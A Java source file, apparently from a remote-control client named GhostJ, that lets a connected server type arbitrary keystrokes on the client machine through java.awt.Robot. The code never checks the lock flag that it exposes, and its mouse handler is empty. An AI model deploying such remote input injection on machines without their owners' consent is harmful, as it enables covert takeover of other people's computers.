package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;

import java.awt.*;
import java.awt.event.KeyEvent;

import static java.lang.Thread.sleep;

/**
 * 模拟客户端的鼠标和键盘操作
 */
public class FuncKMR implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!kmr";
	}

	@Override
	public String[] getParamsModel() {
		return new String[0];
	}

	@Override
	public String getDescription() {
		return "keyboard and mouse robot";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}
	static boolean lock=true;
	public static Robot robot;

	static {
		try {
			robot = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		if(params[0].equalsIgnoreCase("unlock")){
			if (params[1].equalsIgnoreCase(ClientMain.name)){
				lock=false;
				HandleConn.writeToServerIgnoreException("已解锁客户端:"+ClientMain.name+"的键鼠操作权限\n");
			}
		}else if(params[0].equalsIgnoreCase("lock")){
			lock=true;
			HandleConn.writeToServerIgnoreException("已锁定键鼠操作权限.\n");
		}else if(params[0].equalsIgnoreCase("key")){
			//key <p[ress]|r[elease]|t[ype]> [params]
			try {
				switch (params[1]) {
					case "t": {
						System.out.println("sub:"+cmd.substring(11));
						char[] stra = cmd.substring(12).toCharArray();
						for (char ch:stra){
							switch (ch) {
								case 'a': {
									doType(KeyEvent.VK_A);
									break;
								}
								case 'b': {
									doType(KeyEvent.VK_B);
									break;
								}
								case 'c': {
									doType(KeyEvent.VK_C);
									break;
								}
								case 'd': {
									doType(KeyEvent.VK_D);
									break;
								}
								case 'e': {
									doType(KeyEvent.VK_E);
									break;
								}
								case 'f': {
									doType(KeyEvent.VK_F);
									break;
								}
								case 'g': {
									doType(KeyEvent.VK_G);
									break;
								}
								case 'h': {
									doType(KeyEvent.VK_H);
									break;
								}
								case 'i': {
									doType(KeyEvent.VK_I);
									break;
								}
								case 'j': {
									doType(KeyEvent.VK_J);
									break;
								}
								case 'k':{
									doType(KeyEvent.VK_K);
									break;
								}
								case 'l':{
									doType(KeyEvent.VK_L);
									break;
								}
								case 'm':{
									doType(KeyEvent.VK_M);
									break;
								}
								case 'n':{
									doType(KeyEvent.VK_N);
									break;
								}
								case 'o':{
									doType(KeyEvent.VK_O);
									break;
								}
								case 'p':{
									doType(KeyEvent.VK_P);
									break;
								}
								case 'q':{
									doType(KeyEvent.VK_Q);
									break;
								}
								case 'r':{
									doType(KeyEvent.VK_R);
									break;
								}
								case 's':{
									doType(KeyEvent.VK_S);
									break;
								}
								case 't':{
									doType(KeyEvent.VK_T);
									break;
								}
								case 'u':{
									doType(KeyEvent.VK_U);
									break;
								}
								case 'v':{
									doType(KeyEvent.VK_V);
									break;
								}case 'w':{
									doType(KeyEvent.VK_W);
									break;
								}case 'x':{
									doType(KeyEvent.VK_X);
									break;
								}case 'y':{
									doType(KeyEvent.VK_Y);
									break;
								}case 'z':{
									doType(KeyEvent.VK_Z);
									break;
								}
								case 'A':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_A);
									break;
								}
								case 'B':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_B);
									break;
								}
								case 'C':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_C);
									break;
								}
								case 'D':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_D);
									break;
								}
								case 'E':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_E);
									break;
								}
								case 'F':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_F);
									break;
								}
								case 'G':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_G);
									break;
								}
								case 'H':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_H);
									break;
								}
								case 'I':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_I);
									break;
								}
								case 'J':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_J);
									break;
								}
								case 'K':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_K);
									break;
								}
								case 'L':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_L);
									break;
								}
								case 'M':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_M);
									break;
								}
								case 'N':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_N);
									break;
								}
								case 'O':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_O);
									break;
								}
								case 'P':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_P);
									break;
								}
								case 'Q':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_Q);
									break;
								}
								case 'R':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_R);
									break;
								}
								case 'S':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_S);
									break;
								}
								case 'T':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_T);
									break;
								}
								case 'U':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_U);
									break;
								}
								case 'V':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_V);
									break;
								}
								case 'W':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_W);
									break;
								}
								case 'X':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_X);
									break;
								}
								case 'Y':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_Y);
									break;
								}
								case 'Z':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_Z);
									break;
								}
								case '`':{
									doType(KeyEvent.VK_BACK_QUOTE);
									break;
								}
								case '0':{
									doType(KeyEvent.VK_0);
									break;
								}
								case '1':{
									doType(KeyEvent.VK_1);
									break;
								}
								case '2':{
									doType(KeyEvent.VK_2);
									break;
								}
								case '3':{
									doType(KeyEvent.VK_3);
									break;
								}
								case '4':{
									doType(KeyEvent.VK_4);
									break;
								}
								case '5':{
									doType(KeyEvent.VK_5);
									break;
								}
								case '6':{
									doType(KeyEvent.VK_6);
									break;
								}
								case '7':{
									doType(KeyEvent.VK_7);
									break;
								}
								case '8':{
									doType(KeyEvent.VK_8);
									break;
								}
								case '9':{
									doType(KeyEvent.VK_9);
									break;
								}
								case '-':{
									doType(KeyEvent.VK_MINUS);
									break;
								}
								case '=':{
									doType(KeyEvent.VK_EQUALS);
									break;
								}
								case '~':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_BACK_QUOTE);
									break;
								}
								case '!':{
									doType(KeyEvent.VK_EXCLAMATION_MARK);
									break;
								}
								case '@':{
									doType(KeyEvent.VK_AT);
									break;
								}
								case '#':{
									doType(KeyEvent.VK_NUMBER_SIGN);
									break;
								}
								case '$':{
									doType(KeyEvent.VK_DOLLAR);
									break;
								}
								case '%':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_5);
									break;
								}
								case '^':{
									doType(KeyEvent.VK_CIRCUMFLEX);
									break;
								}
								case '&':{
									doType(KeyEvent.VK_AMPERSAND);
									break;
								}
								case '*':{
									doType(KeyEvent.VK_ASTERISK);
									break;
								}
								case '(':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_9);
									break;
								}
								case ')':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_0);
									break;
								}
								case '_':{
									doType(KeyEvent.VK_UNDERSCORE);
									break;
								}
								case '+':{
									doType(KeyEvent.VK_PLUS);
									break;
								}
								case '\t':{
									doType(KeyEvent.VK_TAB);
									break;
								}
								case '\n':{
									doType(KeyEvent.VK_ENTER);
									break;
								}
								case '[':{
									doType(KeyEvent.VK_OPEN_BRACKET);
									break;
								}
								case ']':{
									doType(KeyEvent.VK_CLOSE_BRACKET);
									break;
								}
								case '\\':{
									doType(KeyEvent.VK_BACK_SLASH);
									break;
								}
								case '{':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_OPEN_BRACKET);
									break;
								}
								case '}':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_CLOSE_BRACKET);
									break;
								}
								case '|':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_BACK_SLASH);
									break;
								}
								case ';':{
									doType(KeyEvent.VK_SEMICOLON);
									break;
								}
								case ':':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_SEMICOLON);
									break;
								}
								case '\'':{
									doType(KeyEvent.VK_QUOTE);
									break;
								}
								case '"':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_QUOTE);
									break;
								}
								case ',':{
									doType(KeyEvent.VK_COMMA);
									break;
								}
								case '<':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_COMMA);
									break;
								}
								case '.':{
									doType(KeyEvent.VK_PERIOD);
									break;
								}
								case '>':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_PERIOD);
									break;
								}
								case '/':{
									doType(KeyEvent.VK_SLASH);
									break;
								}
								case '?':{
									doType(KeyEvent.VK_SHIFT, KeyEvent.VK_SLASH);
									break;
								}
								case ' ':{
									doType(KeyEvent.VK_SPACE);
									break;
								}
							}
						}
						break;
					}
				}
			}catch (Exception e){
				HandleConn.writeToServerIgnoreException("异常:"+ClientMain.getErrorInfo(e)+"\n");
				e.printStackTrace();
			}
		}else if(params[0].equalsIgnoreCase("mouse")){

		}
	}
	public void doType(int lastKey,int instantKey)throws Exception{
		robot.keyPress(lastKey);
		robot.keyPress(instantKey);
		robot.keyRelease(instantKey);
		robot.keyRelease(lastKey);
	}
	public void doType(int key)throws Exception{
		robot.keyPress(key);
		robot.keyRelease(key);
	}
}
